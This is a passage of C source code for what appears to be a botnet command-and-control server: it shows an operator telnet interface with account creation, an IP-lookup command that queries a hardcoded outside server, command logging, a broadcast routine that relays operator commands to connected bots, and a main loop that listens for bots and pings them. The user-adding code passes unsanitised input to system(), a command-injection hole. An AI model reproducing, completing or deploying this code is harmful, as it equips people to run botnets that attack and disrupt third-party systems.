        }
        sprintf(cmd, "%s %s %s ", username, password, admin);
        sprintf(send1, "echo '%s' >> Info/User_Logins.txt", cmd);
        system(send1);
        memset(buf, 0, sizeof buf);
        printf("\e[1;96m%s Added User: \e[1;37m[\e[0;37m%s\e[1;37m]\r\n",accounts[find_line].id, username);
        sprintf(botnet, "\e[1;0;32mAccount Added As\e[32m: \e[0;37m[\e[1;0;32m%s\e[0;37m]\r\n", username);
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        memset(buf, 0, sizeof buf);
    }
    else
    {
        sprintf(botnet, "%s\e[0;37mPermission Denied!\e[37m\r\n", "ADDUSER - ");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        memset(buf, 0, sizeof buf);
    }
        }
                else if(strstr(buf, "iplookup ") || strstr(buf, "IPLOOKUP "))
        {
            char myhost[20];
            char ki11[1024];
            snprintf(ki11, sizeof(ki11), "%s", buf);
            trim(ki11);
            char *token = strtok(ki11, " ");
            snprintf(myhost, sizeof(myhost), "%s", token+strlen(token)+1);
            if(atoi(myhost) >= 8)
            {
                int ret;
                int IPLSock = -1;
                char iplbuffer[1024];
                int conn_port = 80;
                char iplheaders[1024];
                struct timeval timeout;
                struct sockaddr_in sock;
                char *iplookup_host = "185.132.53.143"; // Change to Server IP
                timeout.tv_sec = 4; // 4 second timeout
                timeout.tv_usec = 0;
                IPLSock = socket(AF_INET, SOCK_STREAM, 0);
                sock.sin_family = AF_INET;
                sock.sin_port = htons(conn_port);
                sock.sin_addr.s_addr = inet_addr(iplookup_host);
                if(connect(IPLSock, (struct sockaddr *)&sock, sizeof(sock)) == -1)
                {
                    //printf("[\e[31m-\e[37m] Failed to connect to iplookup host server...\n");
                    sprintf(botnet, "\e[1;37m[\e[0;31mIPLookup\e[1;37m] \e[0;31mFailed to connect to iplookup server...\e[31;1m\r\n", myhost);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                else
                {
                    //printf("[\e[32m+\e[37m] Connected to iplookup server :)\n");
                    snprintf(iplheaders, sizeof(iplheaders), "GET /iplookup.php?host=%s HTTP/1.1\r\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding:gzip, deflate, sdch\r\nAccept-Language:en-US,en;q=0.8\r\nCache-Control:max-age=0\r\nConnection:keep-alive\r\nHost:%s\r\nUpgrade-Insecure-Requests:1\r\nUser-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36\r\n\r\n", myhost, iplookup_host);
                    if(send(IPLSock, iplheaders, strlen(iplheaders), 0))
                    {
                        //printf("[\e[32m+\e[37m] Sent request headers to iplookup api!\n");
                        sprintf(botnet, "\e[1;37mGetting Info For \e[0;31m-> \e[1;37m%s...\r\n", myhost);
                        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                        char ch;
                        int retrv = 0;
                        uint32_t header_parser = 0;
                        while (header_parser != 0x0D0A0D0A)
                        {
                            if ((retrv = read(IPLSock, &ch, 1)) != 1)
                                break;
                
                            header_parser = (header_parser << 8) | ch;
                        }
                        memset(iplbuffer, 0, sizeof(iplbuffer));
                        while(ret = read(IPLSock, iplbuffer, 1024))
                        {
                            iplbuffer[ret] = '\0';
                            /*if(strlen(iplbuffer) > 1)
                                printf("\e[36m%s\e[37m\n", buffer);*/
                        }
                        //printf("%s\n", iplbuffer);
                        if(strstr(iplbuffer, "<title>404"))
                        {
                            char iplookup_host_token[20];
                            sprintf(iplookup_host_token, "%s", iplookup_host);
                            int ip_prefix = atoi(strtok(iplookup_host_token, "."));
                            sprintf(botnet, "\e[1;37m[\e0;31mIPLookup\e[1;37m] \e[0;31mFailed, API can't be located on server %d.*.*.*:80\e[1;37m\r\n", ip_prefix);
                            memset(iplookup_host_token, 0, sizeof(iplookup_host_token));
                        }
                        else if(strstr(iplbuffer, "nickers"))
                            sprintf(botnet, "\e[0;0;1;37m[\e[1;35mIPLookup\e[1;37m] \e[1;35mFailed, Hosting server needs to have php installed for api to work...\e[1;37m\r\n");
                        else sprintf(botnet, "\e[1;1;37m[\e[1;35m+\e[1;1;37m]\e[1;35m--- \e[1;37mResults\e[1;35m ---\e[1;1;37m[\e[1;35m+\e[1;1;37m]\r\n\e[1;37m%s\e[31m\r\n", iplbuffer);
                        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    }
                    else
                    {
                        //printf("[\e[31m-\e[37m] Failed to send request headers...\n");
                        sprintf(botnet, "\e[0;0;1;37m[\e[1;35mIPLookup\e[1;37m] \e[1;35mFailed to send request headers...\r\n");
                        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    }
                }
                close(IPLSock);
            }
        }
      if (strstr(buf, "resolve") || strstr(buf, "RESOLVE") || strstr(buf, "Resolve")) {
      char *ip[100];
      char *token = strtok(buf, " ");
      char *url = token+sizeof(token);
      trim(url);
      resolve(url, ip);
          sprintf(botnet, "\e[1;37mResolved \e[0;32m[\e[1;37m%s\e[0;32m] [\e[1;37m%s\e[0;32m] \e[0m\r\n", url, ip);
          if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
      }
        //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////     
        trim(buf);
        sprintf(botnet, "\e[1;37mゾディアック\e[1;32m: \e[1;37m", accounts[find_line].user, buf);
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        if(strlen(buf) == 0) continue;
        printf("\e[97mCommand:\e[97m[\e[97m%s\e[97m]\n",accounts[find_line].user, buf);
        FILE *logFile;
        logFile = fopen("Info/server.log", "a");
        fprintf(logFile, "\e[97mUser:[\e[97m%s\e[97m] - Command:\e[97m[\e[97m%s\e[97m]\n", accounts[find_line].user, buf);
        fclose(logFile);
        broadcast(buf, datafd, usernamez);
        memset(buf, 0, 2048);

        } 
        end:    
        managements[datafd].connected = 0;
        close(datafd);
        managesConnected--;
}
void *telnetListener(int port)
{    
        int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("\e[97mScreening Error");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)
        {  printf("\e[97mIncoming Connection From ");
       
        client_addr(cli_addr);
        FILE *logFile;
        logFile = fopen("Info/IP.log", "a");
        fprintf(logFile, "Connection From [%d.%d.%d.%d]\n",cli_addr.sin_addr.s_addr & 0xFF, (cli_addr.sin_addr.s_addr & 0xFF00)>>8, (cli_addr.sin_addr.s_addr & 0xFF0000)>>16, (cli_addr.sin_addr.s_addr & 0xFF000000)>>24);
        fclose(logFile);
        newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
        if (newsockfd < 0) perror("ERROR on accept");
        pthread_t thread;
        pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd);
        }
}
 
int main (int argc, char *argv[], void *sock)
{
        signal(SIGPIPE, SIG_IGN);
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4)
        {
        fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
        exit (EXIT_FAILURE);
        }
        port = atoi(argv[3]);
        threads = atoi(argv[2]);
        if (threads > 1000)
        {
        printf("\e[97mThread Limit Exceeded! Please Lower Threat Count!\n");
        return 0;
        }
        else if (threads < 1000)
        {
        printf("");
        }
        printf("\e[97m\n");
        listenFD = create_and_bind(argv[1]); 
        if (listenFD == -1) abort();
    
        s = make_socket_non_blocking (listenFD); 
        if (s == -1) abort();
 
        s = listen (listenFD, SOMAXCONN); 
        if (s == -1)
        {
        perror ("listen");
        abort ();
        }
        epollFD = epoll_create1 (0); 
        if (epollFD == -1)
        {
        perror ("epoll_create");
        abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
        perror ("epoll_ctl");
        abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--)
        {
        pthread_create( &thread[threads + 1], NULL, &epollEventLoop, (void *) NULL); 
        }
        pthread_create(&thread[0], NULL, &telnetListener, port);
        while(1)
        {
        broadcast("PING", -1, "STRING");
        sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}